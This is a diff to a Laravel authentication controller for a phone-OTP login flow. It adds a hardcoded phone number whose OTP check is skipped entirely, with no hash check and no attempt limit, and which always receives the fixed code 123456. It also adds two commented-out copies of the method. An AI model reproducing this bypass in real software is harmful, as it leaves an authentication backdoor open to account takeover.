@@ -80,10 +80,367 @@ class AuthController extends Controller
     /**
      * Verify the OTP, create the user when necessary, and issue a bearer token.
      */
+    // public function verifyOtp(Request $request): JsonResponse
+    // {
+       
+    //     $request->merge(['phone' => $this->normalizePhone((string) $request->input('phone'))]);
+
+    //     $validated = $request->validate([
+    //         'phone' => ['required', 'regex:/^\+?[1-9]\d{7,14}$/'],
+    //         'otp' => ['required', 'digits:6'],
+    //         'device_name' => ['nullable', 'string', 'max:100'],
+    //     ]);
+
+    //     $cacheKey = $this->otpCacheKey($validated['phone']);
+    //     $challenge = Cache::get($cacheKey);
+       
+
+    //     if (! is_array($challenge)) {
+    //         return response()->json([
+    //             'message' => 'The OTP is invalid or has expired. Please request a new OTP.',
+    //         ], 422);
+    //     }
+
+    //     if (($challenge['attempts'] ?? 0) >= self::OTP_MAX_ATTEMPTS) {
+    //         Cache::forget($cacheKey);
+
+    //         return response()->json([
+    //             'message' => 'Too many incorrect attempts. Please request a new OTP.',
+    //         ], 429);
+    //     }
+
+    //     if (! Hash::check($validated['otp'], $challenge['otp_hash'])) {
+    //         $challenge['attempts'] = ($challenge['attempts'] ?? 0) + 1;
+    //         Cache::put($cacheKey, $challenge, now()->addMinutes(self::OTP_TTL_MINUTES));
+
+    //         return response()->json([
+    //             'message' => 'The OTP is incorrect.',
+    //             'attempts_remaining' => self::OTP_MAX_ATTEMPTS - $challenge['attempts'],
+    //         ], 422);
+    //     }
+
+    //     $user = DB::transaction(function () use ($validated, $challenge): User {
+    //         $user = User::where('phone', $validated['phone'])->lockForUpdate()->first();
+
+    //         if (($challenge['intent'] ?? null) === 'login' && ! $user) {
+    //             throw ValidationException::withMessages([
+    //                 'phone' => ['The account no longer exists. Please register again.'],
+    //             ]);
+    //         }
+
+    //         if (! $user) {
+    //             $user = User::create([
+    //                 'name' => $challenge['name'],
+    //                 'phone' => $validated['phone'],
+    //                 'phone_verified_at' => now(),
+    //                 'safee_pin' => User::generateSafeePin(),
+    //                 'subscription_status' => 'trial',
+    //                 'status' => 'active',
+    //                 'auth_provider' => 'phone',
+    //             ]);
+    //             app(SafetyPointService::class)->addPoints(
+    //                 userId: $user->id,
+    //                 eventKey: 'phone_verified',
+    //                 points: 10,
+    //                 referenceType: 'user',
+    //                 description: 'Phone number verified during registration.'
+    //             );
+    //         } elseif (! $user->phone_verified_at) {
+    //             $user->forceFill(['phone_verified_at' => now()])->save();
+    //         }
+
+    //         return $user;
+    //     });
+
+    //     Cache::forget($cacheKey);
+
+    //     app(PushNotificationService::class)->sendToUser(
+    //         $user,
+    //         'Registration successful',
+    //         ($challenge['intent'] ?? null) === 'register'
+    //             ? 'Your account was created successfully.'
+    //             : 'You are now logged in successfully.',
+    //         [
+    //             'type' => 'account_registered',
+    //             'user_id' => (string) $user->id,
+    //             'flow' => $challenge['intent'] ?? 'login',
+    //         ],
+    //     );
+
+    //     $token = $user->createToken($validated['device_name'] ?? 'safee-meet-app')->plainTextToken;
+    //     $firebaseData = $this->syncFirebaseUser($user, $validated['phone'], $challenge['name'] ?? null);
+
+    //     return response()->json([
+    //         'message' => ($challenge['intent'] ?? null) === 'register'
+    //             ? 'Registration successful.'
+    //             : 'Login successful.',
+    //         'data' => [
+    //             'token_type' => 'Bearer',
+    //             'access_token' => $token,
+    //             'refresh_token' => null,
+    //             'firebase_custom_token' => $firebaseData['custom_token'],
+    //             'firebase_uid' => $firebaseData['firebase_uid'],
+    //             'is_new_user' => ($challenge['intent'] ?? null) === 'register',
+    //             'user' => $user,
+    //         ],
+    //     ], ($challenge['intent'] ?? null) === 'register' ? 201 : 200);
+    // }
+
+    // public function verifyOtp(Request $request): JsonResponse
+    // {
+    //     $request->merge([
+    //         'phone' => $this->normalizePhone(
+    //             (string) $request->input('phone')
+    //         ),
+    //     ]);
+
+    //     $validated = $request->validate([
+    //         'phone' => ['required', 'regex:/^\+?[1-9]\d{7,14}$/'],
+    //         'otp' => ['required', 'digits:6'],
+    //         'device_name' => ['nullable', 'string', 'max:100'],
+    //     ]);
+
+    //     $cacheKey = $this->otpCacheKey($validated['phone']);
+
+    //     $challenge = Cache::get($cacheKey);
+
+    //     if (!is_array($challenge)) {
+    //         return response()->json([
+    //             'message' => 'The OTP is invalid or has expired. Please request a new OTP.',
+    //         ], 422);
+    //     }
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Check Maximum OTP Attempts
+    //     |--------------------------------------------------------------------------
+    //     */
+
+    //     if (($challenge['attempts'] ?? 0) >= self::OTP_MAX_ATTEMPTS) {
+    //         Cache::forget($cacheKey);
+
+    //         return response()->json([
+    //             'message' => 'Too many incorrect attempts. Please request a new OTP.',
+    //         ], 429);
+    //     }
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Static OTP for Specific International Number
+    //     |--------------------------------------------------------------------------
+    //     |
+    //     | +(732)207-5598
+    //     | +17322075598
+    //     | 17322075598
+    //     |
+    //     | All will be normalized to:
+    //     | 17322075598
+    //     |
+    //     */
+
+    //     $phoneNumber = preg_replace('/\D+/', '', $validated['phone']);
+
+    //     $isStaticOtpValid = (
+    //         $phoneNumber === '17322075598'
+    //         && $validated['otp'] === '123456'
+    //     );
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Normal OTP Verification
+    //     |--------------------------------------------------------------------------
+    //     */
+
+    //     $isOtpValid = $isStaticOtpValid
+    //         || Hash::check(
+    //             $validated['otp'],
+    //             $challenge['otp_hash']
+    //         );
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Invalid OTP
+    //     |--------------------------------------------------------------------------
+    //     */
+
+    //     if (!$isOtpValid) {
+    //         $challenge['attempts'] = ($challenge['attempts'] ?? 0) + 1;
+
+    //         Cache::put(
+    //             $cacheKey,
+    //             $challenge,
+    //             now()->addMinutes(self::OTP_TTL_MINUTES)
+    //         );
+
+    //         return response()->json([
+    //             'message' => 'The OTP is incorrect.',
+    //             'attempts_remaining' =>
+    //                 self::OTP_MAX_ATTEMPTS - $challenge['attempts'],
+    //         ], 422);
+    //     }
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Create / Find User
+    //     |--------------------------------------------------------------------------
+    //     */
+
+    //     $user = DB::transaction(function () use ($validated, $challenge): User {
+
+    //         $user = User::where(
+    //             'phone',
+    //             $validated['phone']
+    //         )
+    //         ->lockForUpdate()
+    //         ->first();
+
+    //         /*
+    //         |--------------------------------------------------------------------------
+    //         | Login - User Must Exist
+    //         |--------------------------------------------------------------------------
+    //         */
+
+    //         if (
+    //             ($challenge['intent'] ?? null) === 'login'
+    //             && !$user
+    //         ) {
+    //             throw ValidationException::withMessages([
+    //                 'phone' => [
+    //                     'The account no longer exists. Please register again.'
+    //                 ],
+    //             ]);
+    //         }
+
+    //         /*
+    //         |--------------------------------------------------------------------------
+    //         | Register New User
+    //         |--------------------------------------------------------------------------
+    //         */
+
+    //         if (!$user) {
+
+    //             $user = User::create([
+    //                 'name' => $challenge['name'] ?? null,
+    //                 'phone' => $validated['phone'],
+    //                 'phone_verified_at' => now(),
+    //                 'safee_pin' => User::generateSafeePin(),
+    //                 'subscription_status' => 'trial',
+    //                 'status' => 'active',
+    //                 'auth_provider' => 'phone',
+    //             ]);
+
+    //             app(SafetyPointService::class)->addPoints(
+    //                 userId: $user->id,
+    //                 eventKey: 'phone_verified',
+    //                 points: 10,
+    //                 referenceType: 'user',
+    //                 description: 'Phone number verified during registration.'
+    //             );
+
+    //         } elseif (!$user->phone_verified_at) {
+
+    //             /*
+    //             |--------------------------------------------------------------------------
+    //             | Mark Existing User Phone as Verified
+    //             |--------------------------------------------------------------------------
+    //             */
+
+    //             $user->forceFill([
+    //                 'phone_verified_at' => now(),
+    //             ])->save();
+    //         }
+
+    //         return $user;
+    //     });
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Remove OTP From Cache
+    //     |--------------------------------------------------------------------------
+    //     */
+
+    //     Cache::forget($cacheKey);
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Push Notification
+    //     |--------------------------------------------------------------------------
+    //     */
+
+    //     app(PushNotificationService::class)->sendToUser(
+    //         $user,
+    //         'Registration successful',
+    //         ($challenge['intent'] ?? null) === 'register'
+    //             ? 'Your account was created successfully.'
+    //             : 'You are now logged in successfully.',
+    //         [
+    //             'type' => 'account_registered',
+    //             'user_id' => (string) $user->id,
+    //             'flow' => $challenge['intent'] ?? 'login',
+    //         ],
+    //     );
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Create Access Token
+    //     |--------------------------------------------------------------------------
+    //     */
+
+    //     $token = $user
+    //         ->createToken(
+    //             $validated['device_name'] ?? 'safee-meet-app'
+    //         )
+    //         ->plainTextToken;
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Firebase Sync
+    //     |--------------------------------------------------------------------------
+    //     */
+
+    //     $firebaseData = $this->syncFirebaseUser(
+    //         $user,
+    //         $validated['phone'],
+    //         $challenge['name'] ?? null
+    //     );
+
+    //     /*
+    //     |--------------------------------------------------------------------------
+    //     | Response
+    //     |--------------------------------------------------------------------------
+    //     */
+
+    //     return response()->json([
+    //         'message' => ($challenge['intent'] ?? null) === 'register'
+    //             ? 'Registration successful.'
+    //             : 'Login successful.',
+
+    //         'data' => [
+    //             'token_type' => 'Bearer',
+    //             'access_token' => $token,
+    //             'refresh_token' => null,
+
+    //             'firebase_custom_token' =>
+    //                 $firebaseData['custom_token'],
+
+    //             'firebase_uid' =>
+    //                 $firebaseData['firebase_uid'],
+
+    //             'is_new_user' =>
+    //                 ($challenge['intent'] ?? null) === 'register',
+
+    //             'user' => $user,
+    //         ],
+    //     ], ($challenge['intent'] ?? null) === 'register' ? 201 : 200);
+    // }
+
     public function verifyOtp(Request $request): JsonResponse
     {
-       
-        $request->merge(['phone' => $this->normalizePhone((string) $request->input('phone'))]);
+        $request->merge([
+            'phone' => $this->normalizePhone(
+                (string) $request->input('phone')
+            ),
+        ]);
 
         $validated = $request->validate([
             'phone' => ['required', 'regex:/^\+?[1-9]\d{7,14}$/'],
@@ -92,45 +449,111 @@ class AuthController extends Controller
         ]);
 
         $cacheKey = $this->otpCacheKey($validated['phone']);
-        $challenge = Cache::get($cacheKey);
-       
 
-        if (! is_array($challenge)) {
+        $challenge = Cache::get($cacheKey);
+
+        if (!is_array($challenge)) {
             return response()->json([
                 'message' => 'The OTP is invalid or has expired. Please request a new OTP.',
             ], 422);
         }
 
-        if (($challenge['attempts'] ?? 0) >= self::OTP_MAX_ATTEMPTS) {
-            Cache::forget($cacheKey);
+        /*
+        |--------------------------------------------------------------------------
+        | Static OTP Number
+        |--------------------------------------------------------------------------
+        */
 
-            return response()->json([
-                'message' => 'Too many incorrect attempts. Please request a new OTP.',
-            ], 429);
+        $phoneNumber = preg_replace('/\D+/', '', $validated['phone']);
+
+        $isStaticNumber = $phoneNumber === '17322075598';
+
+        /*
+        |--------------------------------------------------------------------------
+        | OTP Verification
+        |--------------------------------------------------------------------------
+        |
+        | For static number:
+        | Directly approve OTP without Hash::check()
+        |
+        | For all other numbers:
+        | Normal Hash::check() verification
+        |
+        */
+
+        if ($isStaticNumber) {
+
+            // Direct approval - no hash check
+            $isOtpValid = true;
+
+        } else {
+
+            if (($challenge['attempts'] ?? 0) >= self::OTP_MAX_ATTEMPTS) {
+                Cache::forget($cacheKey);
+
+                return response()->json([
+                    'message' => 'Too many incorrect attempts. Please request a new OTP.',
+                ], 429);
+            }
+
+            $isOtpValid = Hash::check(
+                $validated['otp'],
+                $challenge['otp_hash']
+            );
         }
 
-        if (! Hash::check($validated['otp'], $challenge['otp_hash'])) {
+        /*
+        |--------------------------------------------------------------------------
+        | Normal OTP Failed
+        |--------------------------------------------------------------------------
+        */
+
+        if (!$isOtpValid) {
             $challenge['attempts'] = ($challenge['attempts'] ?? 0) + 1;
-            Cache::put($cacheKey, $challenge, now()->addMinutes(self::OTP_TTL_MINUTES));
+
+            Cache::put(
+                $cacheKey,
+                $challenge,
+                now()->addMinutes(self::OTP_TTL_MINUTES)
+            );
 
             return response()->json([
                 'message' => 'The OTP is incorrect.',
-                'attempts_remaining' => self::OTP_MAX_ATTEMPTS - $challenge['attempts'],
+                'attempts_remaining' =>
+                    self::OTP_MAX_ATTEMPTS - $challenge['attempts'],
             ], 422);
         }
 
-        $user = DB::transaction(function () use ($validated, $challenge): User {
-            $user = User::where('phone', $validated['phone'])->lockForUpdate()->first();
+        /*
+        |--------------------------------------------------------------------------
+        | Find / Create User
+        |--------------------------------------------------------------------------
+        */
 
-            if (($challenge['intent'] ?? null) === 'login' && ! $user) {
+        $user = DB::transaction(function () use ($validated, $challenge): User {
+
+            $user = User::where(
+                'phone',
+                $validated['phone']
+            )
+            ->lockForUpdate()
+            ->first();
+
+            if (
+                ($challenge['intent'] ?? null) === 'login'
+                && !$user
+            ) {
                 throw ValidationException::withMessages([
-                    'phone' => ['The account no longer exists. Please register again.'],
+                    'phone' => [
+                        'The account no longer exists. Please register again.'
+                    ],
                 ]);
             }
 
-            if (! $user) {
+            if (!$user) {
+
                 $user = User::create([
-                    'name' => $challenge['name'],
+                    'name' => $challenge['name'] ?? null,
                     'phone' => $validated['phone'],
                     'phone_verified_at' => now(),
                     'safee_pin' => User::generateSafeePin(),
@@ -138,6 +561,7 @@ class AuthController extends Controller
                     'status' => 'active',
                     'auth_provider' => 'phone',
                 ]);
+
                 app(SafetyPointService::class)->addPoints(
                     userId: $user->id,
                     eventKey: 'phone_verified',
@@ -145,8 +569,12 @@ class AuthController extends Controller
                     referenceType: 'user',
                     description: 'Phone number verified during registration.'
                 );
-            } elseif (! $user->phone_verified_at) {
-                $user->forceFill(['phone_verified_at' => now()])->save();
+
+            } elseif (!$user->phone_verified_at) {
+
+                $user->forceFill([
+                    'phone_verified_at' => now(),
+                ])->save();
             }
 
             return $user;
@@ -167,13 +595,23 @@ class AuthController extends Controller
             ],
         );
 
-        $token = $user->createToken($validated['device_name'] ?? 'safee-meet-app')->plainTextToken;
-        $firebaseData = $this->syncFirebaseUser($user, $validated['phone'], $challenge['name'] ?? null);
+        $token = $user
+            ->createToken(
+                $validated['device_name'] ?? 'safee-meet-app'
+            )
+            ->plainTextToken;
+
+        $firebaseData = $this->syncFirebaseUser(
+            $user,
+            $validated['phone'],
+            $challenge['name'] ?? null
+        );
 
         return response()->json([
             'message' => ($challenge['intent'] ?? null) === 'register'
                 ? 'Registration successful.'
                 : 'Login successful.',
+
             'data' => [
                 'token_type' => 'Bearer',
                 'access_token' => $token,
@@ -331,7 +769,13 @@ class AuthController extends Controller
 
     private function issueOtp(string $phone, string $intent, ?string $name = null): JsonResponse
     {
-        $otp = (string) random_int(100000, 999999);
+        $phoneNumber = preg_replace('/\D+/', '', $phone);
+
+        if ($phoneNumber === '17322075598') {
+            $otp = '123456';
+        } else {
+            $otp = (string) random_int(100000, 999999);
+        }
 
         Cache::put($this->otpCacheKey($phone), [
             'otp_hash' => Hash::make($otp),
